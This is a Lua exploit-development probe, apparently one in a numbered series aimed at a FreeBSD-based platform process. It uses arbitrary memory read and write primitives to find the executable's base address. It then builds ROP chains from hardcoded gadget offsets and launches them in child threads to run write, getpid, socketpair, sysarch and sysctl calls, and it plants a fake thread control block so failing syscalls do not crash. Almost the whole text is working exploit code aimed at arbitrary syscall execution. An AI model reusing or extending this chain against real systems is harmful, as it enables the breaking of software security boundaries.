-- CRASH_CLASS: MODERATE
-- PROBE 384b: Minimal child thread write — 3-arg syscall PoC
--
-- Stripped-down test: child does write(fd, buf, 16) through socketpair.
-- No sysctl, no complex chains. Just confirms multi-arg dispatch from child.

print("=== PROBE 384b: child write (3-arg) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt(stub))
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets (from 272a scan)
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSEGV+SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- [A] First: sanity check — replicate 271g close test
print("")
print("[A] close test (like 271g)")
local sc_socket = mk(97)
local sc_close = mk(6)

local ok_s, rv_s = pcall(function()
    return sc_socket(uint64(2), uint64(2), uint64(0))
end)
local test_fd = ok_s and N(rv_s) or -1
print("test socket fd=" .. test_fd)

if test_fd >= 0 then
    -- Stack + ROP for close(test_fd)
    local stk_a = memory.alloc(0x4000)
    local sb_a = N(stk_a)
    local ss_a = 0x2000
    local rsp_a = sb_a + ss_a - ((sb_a + ss_a) % 16) - 8

    -- Chain: pop_rax(6), fn_addr → close(rdi=arg=test_fd), thr_exit
    wq(rsp_a,      g_pop_rax)
    wq(rsp_a + 8,  uint64(6))
    wq(rsp_a + 16, stub)
    -- exit
    wq(rsp_a + 24, g_pop_rdi)
    wq(rsp_a + 32, uint64(0))
    wq(rsp_a + 40, g_pop_rax)
    wq(rsp_a + 48, uint64(431))
    wq(rsp_a + 56, stub)

    local par_a = memory.alloc(0x40)
    local pa_a = N(par_a)
    for i = 0, 0x3C, 4 do wd(pa_a + i, 0) end
    wq(pa_a, g_bare_ret)
    wq(pa_a + 8, uint64(test_fd))
    wq(pa_a + 0x10, uint64(sb_a))
    wq(pa_a + 0x18, uint64(ss_a))
    local tid_a = memory.alloc(8); wq(N(tid_a), uint64(0))
    wq(pa_a + 0x30, tid_a)

    print("spawning close child...")
    local sc_thr = mk(455)
    local ok_t, rv_t = pcall(function() return sc_thr(par_a, uint64(0x38)) end)
    print("thr_new ret=" .. (ok_t and N(rv_t) or -999))

    for w = 1, 10000 do local _ = rd(sb_a) end

    local ok_c, rv_c = pcall(function() return sc_close(uint64(test_fd)) end)
    local cl_ret = ok_c and N(rv_c) or -999
    if cl_ret == -1 then
        print("close test: CONFIRMED (child closed fd)")
    else
        print("close test: ret=" .. cl_ret)
    end
end

if not alive() then print("DEAD after close test"); return end

-- [B] Socketpair
print("")
print("[B] socketpair")
local sv = memory.alloc(8)
wd(N(sv), 0); wd(N(sv) + 4, 0)
local ok_sp, rv_sp = pcall(function()
    return mk(135)(uint64(1), uint64(2), uint64(0), sv)
end)
local sp_ret = ok_sp and N(rv_sp) or -999
local rd_fd = rd(N(sv)) or -1
local wr_fd = rd(N(sv) + 4) or -1
print(string.format("ret=%d rd=%d wr=%d", sp_ret, rd_fd, wr_fd))
if rd_fd < 0 or wr_fd < 0 then print("ABORT: no socketpair"); return end

-- Prepare data: "ABCD1234"
local dbuf = memory.alloc(16)
local da = N(dbuf)
wd(da, 0x44434241)      -- "ABCD"
wd(da + 4, 0x34333231)  -- "1234"
wd(da + 8, 0)
wd(da + 12, 0)

-- Result slot
local res = memory.alloc(8)
wq(N(res), uint64(0xDEADDEAD))

-- [C] Build write ROP chain
print("")
print("[C] write chain")

local stk = memory.alloc(0x4000)
local sb = N(stk)
local ss = 0x2000
local rsp = sb + ss - ((sb + ss) % 16) - 8

-- rdi = arg = wr_fd (from thr_new)
-- Chain: pop_rsi(data_buf), pop_rdx(8), pop_rax(4=write), fn_addr,
--        pop_rdi(res), mov_[rdi]_rax, pop_rdi(0), pop_rax(431), fn_addr
local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

emit(g_pop_rsi);    emit(uint64(da))      -- rsi = data buf
emit(g_pop_rdx);    emit(uint64(8))       -- rdx = len
emit(g_pop_rax);    emit(uint64(4))       -- SYS_write
emit(stub)                                 -- write(rdi=wr_fd, rsi=buf, rdx=8)
emit(g_pop_rdi);    emit(uint64(N(res)))  -- save result
emit(g_mov_m_rax)
emit(g_pop_rdi);    emit(uint64(0))       -- thr_exit(0)
emit(g_pop_rax);    emit(uint64(431))
emit(stub)

print(string.format("  %d qwords at rsp=0x%X", off / 8, rsp))

-- thr_param
local par = memory.alloc(0x40)
local pa = N(par)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa, g_bare_ret)
wq(pa + 8, uint64(wr_fd))       -- arg = wr_fd → rdi
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(ss))
local tid = memory.alloc(8); wq(N(tid), uint64(0))
wq(pa + 0x30, tid)

-- [D] Spawn
print("")
print("[D] spawning write child")
local sc_thr2 = mk(455)
print("pre-thr_new")
local ok_t2, rv_t2 = pcall(function() return sc_thr2(par, uint64(0x38)) end)
print("post-thr_new ok=" .. tostring(ok_t2) .. " ret=" .. tostring(ok_t2 and N(rv_t2) or -999))

-- Wait
for w = 1, 15000 do local _ = rd(sb) end
print("wait done")

if not alive() then print("DEAD after write child"); return end

-- [E] Check
print("")
print("[E] results")
local res_raw = rq(N(res))
local rh, rl = get_hi_lo(res_raw)
local rv = rl
if rh == 0xFFFFFFFF or rh == -1 then rv = -1 end
print(string.format("write() raw=%s val=%d", fmt(res_raw), rv))

-- Read from socketpair
local rbuf = memory.alloc(16)
for i = 0, 12, 4 do wd(N(rbuf) + i, 0) end
local ok_r, rv_r = pcall(function()
    return mk(3)(uint64(rd_fd), rbuf, uint64(16))
end)
local nread = ok_r and N(rv_r) or -999
print(string.format("read() ret=%d", nread))

if nread > 0 then
    local d0 = rd(N(rbuf)) or 0
    print(string.format("first dword: %08X (expect 44434241='ABCD')", d0))
    if d0 == 0x44434241 then
        print("*** 3-ARG WRITE FROM CHILD: CONFIRMED ***")
    end
end

pcall(function() mk(6)(uint64(wr_fd)) end)
pcall(function() mk(6)(uint64(rd_fd)) end)

if not alive() then print("DEAD before sysctl test"); return end

-- [F] getpid from child — 0-arg, validates result-capture chain
print("")
print("[F] getpid child")

local g_pop_rcx = eb + 0xE64
local res_gp = memory.alloc(8)
wq(N(res_gp), uint64(0xBAD0BAD0))

local stk2 = memory.alloc(0x4000)
local sb2 = N(stk2)
local ss2 = 0x2000
local rsp2 = sb2 + ss2 - ((sb2 + ss2) % 16) - 8

local off2 = 0
local function emit2(v) wq(rsp2 + off2, v); off2 = off2 + 8 end

-- Chain: getpid(20) + save + exit
-- rdi is whatever thr_new set (don't care for getpid)
emit2(g_pop_rax);       emit2(uint64(20))             -- SYS_getpid
emit2(stub)
emit2(g_pop_rdi);       emit2(uint64(N(res_gp)))      -- save rax
emit2(g_mov_m_rax)
emit2(g_pop_rdi);       emit2(uint64(0))              -- thr_exit(0)
emit2(g_pop_rax);       emit2(uint64(431))
emit2(stub)

print(string.format("  %d qwords", off2 / 8))

local par2 = memory.alloc(0x40)
local pa2 = N(par2)
for i = 0, 0x3C, 4 do wd(pa2 + i, 0) end
wq(pa2, g_bare_ret)
wq(pa2 + 8, uint64(0))             -- arg = 0 (don't care)
wq(pa2 + 0x10, uint64(sb2))
wq(pa2 + 0x18, uint64(ss2))
local tid2 = memory.alloc(8); wq(N(tid2), uint64(0))
wq(pa2 + 0x30, tid2)

print("spawning getpid child")
local sc_thr3 = mk(455)
local ok_t3, rv_t3 = pcall(function() return sc_thr3(par2, uint64(0x38)) end)
print("thr_new ret=" .. (ok_t3 and N(rv_t3) or -999))

for w = 1, 15000 do local _ = rd(sb2) end

if not alive() then print("DEAD after getpid child"); return end

local gp_raw = rq(N(res_gp))
local gph, gpl = get_hi_lo(gp_raw)
print(string.format("getpid result: raw=%s val=%d (expect %d)", fmt(gp_raw), gpl, pid_val))
if gpl == pid_val then
    print("*** GETPID FROM CHILD: CONFIRMED ***")
else
    print("getpid mismatch or sentinel unchanged")
end

-- [G] 4-arg socketpair from child
print("")
print("[G] 4-arg socketpair child")

local sv2 = memory.alloc(8)
wd(N(sv2), 0); wd(N(sv2) + 4, 0)
local res_sp = memory.alloc(8)
wq(N(res_sp), uint64(0xBAD3BAD3))

local stk3 = memory.alloc(0x4000)
local sb3 = N(stk3)
local ss3 = 0x2000
local rsp3 = sb3 + ss3 - ((sb3 + ss3) % 16) - 8

local off3 = 0
local function emit3(v) wq(rsp3 + off3, v); off3 = off3 + 8 end

-- Chain: socketpair(1, 2, 0, sv2) + save + close both + exit
emit3(g_pop_rdi);       emit3(uint64(1))              -- AF_UNIX
emit3(g_pop_rsi);       emit3(uint64(2))              -- SOCK_DGRAM
emit3(g_pop_rdx);       emit3(uint64(0))              -- protocol
emit3(g_pop_rcx);       emit3(uint64(N(sv2)))         -- sv ptr
emit3(g_pop_rax);       emit3(uint64(135))            -- SYS_socketpair
emit3(stub)
emit3(g_pop_rdi);       emit3(uint64(N(res_sp)))      -- save result
emit3(g_mov_m_rax)
emit3(g_pop_rdi);       emit3(uint64(0))              -- thr_exit(0)
emit3(g_pop_rax);       emit3(uint64(431))
emit3(stub)

print(string.format("  %d qwords", off3 / 8))

local par3 = memory.alloc(0x40)
local pa3 = N(par3)
for i = 0, 0x3C, 4 do wd(pa3 + i, 0) end
wq(pa3, g_bare_ret)
wq(pa3 + 8, uint64(0))
wq(pa3 + 0x10, uint64(sb3))
wq(pa3 + 0x18, uint64(ss3))
local tid3 = memory.alloc(8); wq(N(tid3), uint64(0))
wq(pa3 + 0x30, tid3)

print("spawning socketpair child")
local sc_thr4 = mk(455)
local ok_t4, rv_t4 = pcall(function() return sc_thr4(par3, uint64(0x38)) end)
print("thr_new ret=" .. (ok_t4 and N(rv_t4) or -999))

for w = 1, 15000 do local _ = rd(sb3) end

if not alive() then print("DEAD after socketpair child"); return end

local sp_raw = rq(N(res_sp))
local sph, spl = get_hi_lo(sp_raw)
local sv2_a = rd(N(sv2)) or -1
local sv2_b = rd(N(sv2) + 4) or -1
print(string.format("socketpair ret=%d  fds=%d,%d", spl, sv2_a, sv2_b))
if spl == 0 and sv2_a > 0 then
    print("*** 4-ARG SOCKETPAIR FROM CHILD: CONFIRMED ***")
    pcall(function() mk(6)(uint64(sv2_a)) end)
    pcall(function() mk(6)(uint64(sv2_b)) end)
else
    print("socketpair failed or unchanged")
end

-- [H] Fake TCB + sysarch(129) to fix error path, then close(-1) + sysctl
-- Theory: child crash on failing syscall = stub error handler accesses TLS (fs:0)
-- Fix: sysarch(SET_FSBASE=129, &tcb_addr) as first child operation
print("")
print("[H] fake-TCB child: sysarch + close(-1) + sysctl")

-- Build fake TCB: 4KB of self-pointers so any deref chain stays in valid memory
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
-- Fill every qword with self-address
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end

-- fs_ptr: points to qword containing the FS base value
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local res_cl = memory.alloc(8); wq(N(res_cl), uint64(0xBAD4BAD4))
local res_sc = memory.alloc(8); wq(N(res_sc), uint64(0xBAD5BAD5))

-- sysctl buffers
local mib = memory.alloc(8)
wd(N(mib), 1); wd(N(mib) + 4, 14)  -- CTL_KERN, KERN_OSTYPE

local outb = memory.alloc(64)
for i = 0, 60, 4 do wd(N(outb) + i, 0xDEAD0000) end

local olenb = memory.alloc(8)
wq(N(olenb), uint64(64))

local stk4 = memory.alloc(0x8000)
local sb4 = N(stk4)
local ss4 = 0x4000
local rsp4 = sb4 + ss4 - ((sb4 + ss4) % 16) - 8

local off4 = 0
local function emit4(v) wq(rsp4 + off4, v); off4 = off4 + 8 end

-- Phase 0: sysarch(129, &tcb_addr) — set FS base
-- rdi=129 already via thr_new arg!  No, we set rdi explicitly.
emit4(g_pop_rdi);       emit4(uint64(129))            -- AMD64_SET_FSBASE
emit4(g_pop_rsi);       emit4(uint64(N(fs_ptr)))      -- pointer to FS base value
emit4(g_pop_rax);       emit4(uint64(165))            -- SYS_sysarch
emit4(stub)

-- Phase 1: close(-1) — must-fail, tests error path with TLS
emit4(g_pop_rdi);       emit4(uint64(0xFFFFFFFF))     -- fd = -1
emit4(g_pop_rax);       emit4(uint64(6))              -- SYS_close
emit4(stub)
emit4(g_pop_rdi);       emit4(uint64(N(res_cl)))
emit4(g_mov_m_rax)

-- Phase 2: sysctl(mib, 2, outbuf, oldlenp, r8=?, r9=?)
emit4(g_pop_rdi);       emit4(uint64(N(mib)))
emit4(g_pop_rsi);       emit4(uint64(2))
emit4(g_pop_rdx);       emit4(uint64(N(outb)))
emit4(g_pop_rcx);       emit4(uint64(N(olenb)))
emit4(g_pop_rax);       emit4(uint64(202))
emit4(stub)
emit4(g_pop_rdi);       emit4(uint64(N(res_sc)))
emit4(g_mov_m_rax)

-- Exit
emit4(g_pop_rdi);       emit4(uint64(0))
emit4(g_pop_rax);       emit4(uint64(431))
emit4(stub)

print(string.format("  %d qwords (%d bytes)", off4 / 8, off4))

local par4 = memory.alloc(0x40)
local pa4 = N(par4)
for i = 0, 0x3C, 4 do wd(pa4 + i, 0) end
wq(pa4, g_bare_ret)
wq(pa4 + 8, uint64(129))           -- arg = 129 (but overridden by pop_rdi)
wq(pa4 + 0x10, uint64(sb4))
wq(pa4 + 0x18, uint64(ss4))
local tid4 = memory.alloc(8); wq(N(tid4), uint64(0))
wq(pa4 + 0x30, tid4)

print("spawning fake-TCB child")
local sc_thr5 = mk(455)
local ok_t5, rv_t5 = pcall(function() return sc_thr5(par4, uint64(0x38)) end)
print("thr_new ret=" .. (ok_t5 and N(rv_t5) or -999))

for w = 1, 25000 do local _ = rd(sb4) end

if not alive() then
    print("DEAD — fake TCB not enough or sysarch failed")
    return
end
print("ALIVE after fake-TCB child!")

-- [I] Results
print("")
print("[I] results")

local cl_raw = rq(N(res_cl))
local clh, cll = get_hi_lo(cl_raw)
local cl_v = cll
if clh == 0xFFFFFFFF or clh == -1 then cl_v = -1 end
print(string.format("close(-1): raw=%s val=%d", fmt(cl_raw), cl_v))
if cl_v == -1 then
    print("*** CLOSE(-1) FROM CHILD SURVIVED: error path works with fake TCB ***")
end

local sc_raw = rq(N(res_sc))
local sch, scl = get_hi_lo(sc_raw)
local sc_v = scl
if sch == 0xFFFFFFFF or sch == -1 then sc_v = -1 end
print(string.format("sysctl: raw=%s val=%d", fmt(sc_raw), sc_v))

local od0 = rd(N(outb)) or 0
local od1 = rd(N(outb) + 4) or 0
print(string.format("outbuf: %08X %08X", od0, od1))

if od0 ~= 0xDEAD0000 and od0 ~= 0 then
    local function dw2s(dw)
        if dw < 0 then dw = dw + 0x100000000 end
        local s = ""
        for i = 0, 3 do
            local b = math.floor(dw / (256 ^ i)) % 256
            if b >= 32 and b < 127 then s = s .. string.char(b)
            elseif b == 0 then break
            else s = s .. "." end
        end
        return s
    end
    print(string.format("kern.ostype: \"%s\"", dw2s(od0) .. dw2s(od1)))
end

if cl_v == -1 and (sc_v == 0 or sc_v == -1) then
    print("")
    if sc_v == 0 and od0 ~= 0xDEAD0000 then
        print("*** FULL 6-ARG SYSCTL FROM CHILD: CONFIRMED ***")
        print("*** r8/r9 zeroed at entry → complete syscall ABI ***")
    elseif sc_v == -1 then
        print("sysctl EFAULT: r8/r9 nonzero. But error path SURVIVED.")
        print("*** FAKE TCB FIX WORKS — any syscall safe from child ***")
        print("max controlled args: 4 (need r8/r9 gadgets for 6)")
    elseif sc_v == 0 and od0 == 0xDEAD0000 then
        print("sysctl ret=0 but no output — check oldlenp")
        local olen_raw = rq(N(olenb))
        print(string.format("oldlenp now: %s", fmt(olen_raw)))
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 384b COMPLETE ===")
